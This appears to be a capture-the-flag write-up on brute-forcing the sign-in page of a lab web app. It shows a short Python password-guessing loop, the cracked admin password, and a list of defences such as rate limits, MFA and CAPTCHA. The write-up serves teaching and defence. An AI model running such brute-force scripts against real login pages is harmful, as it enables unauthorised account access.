# BRUTE FORCE ATTACK ON SIGN-IN PAGE

## IDENTIFY THE VULNERABILITY

Upon examination, we discovered that the login page, accessible at http://192.168.56.2/?page=signin, allowed an unlimited number of login attempts, and the authentication process was handled through a GET request.

## EXPLOIT THE VULNERABILITY

We executed a brute force attack by repeatedly attempting unauthorized logins using a Python script and a list of commonly used passwords. The script used the requests library to dispatch multiple GET requests to the login page, each time featuring a distinct password. Then, it checked the response to determine if the login was successful. If the wrong answer image was not present in the response, the login was considered successful.

```python
def login(username: str, password: str) -> bool:
    # Build login url
    url = URL + "&username=" + username + "&password=" + password + "&Login=Login#"
    # Try to login
    content = get_request(url)
    if WRONG_ANSWER_IMG in content.decode():
        return False
    # If the wrong answer image is not present, the login was successful
    return True

def test_common_passwords(username: str) -> None:
    # Read passwords list from an external file
    with open(PASSWORDS_FILE_PATH, 'r', encoding='utf-8') as file:
        for line in file:
            password = line.strip()
            result = login(username, password)
            if (result == True):
                return
```

Ultimately, we were able to gain access to the admin account by guessing the password **"shadow"**. With this knowledge, we can log in using any username, granting us access to the flag.

## INFORMATION ON BRUTE FORCE ATTACKS

A brute force attack uses trial-and-error to guess login info, encryption keys, or find a hidden web page. Hackers work through all possible combinations hoping to guess correctly.
In regards to authentication, when no password policy is in place an attacker can use lists of common username and passwords to brute force a username or password field until successful authentication.

## PATCH THE VULNERABILITY

To limit the risks associated with brute force attacks, consider the following measures:

    1. Switch to POST Request: Prefer using a POST request for login instead of a GET request. This ensures that credentials are sent in the HTTP message body rather than the URL.

    2. Implement Password Complexity:
        - Mix uppercase and lowercase letters.
        - Use alphanumeric combinations.
        - Incorporate special characters for added security.

    3. Limit Login Attempts:
        - Restrict the number of login attempts.
        - Implement IP blocking for repeated failures.
        - Notify users and block accounts after a certain number of unsuccessful attempts.

    4. Require Multi-Factor Authentication (MFA):
        Enforce the use of two-factor authentication. 2FA adds an extra layer of security by requiring users to provide two different authentication factors.

    5. Utilize CAPTCHA:
        Implement CAPTCHA to differentiate between human and automated login attempts.

    6. Deploy a Web Application Firewall (WAF):
        Use a WAF to filter and monitor HTTP traffic, providing an additional layer of protection.

    7. Introduce Time Delay:
        Implement time delays between login attempts to slow down brute force attacks.

    8. Remove any unused accounts with high-level permissions:
    These are the cyber equivalent of doors with weak locks that make breaking in easy.

## SOURCES

https://www.getastra.com/blog/cms/prevent-brute-force-attack-in-php/
https://www.kaspersky.com/resource-center/definitions/brute-force-attack
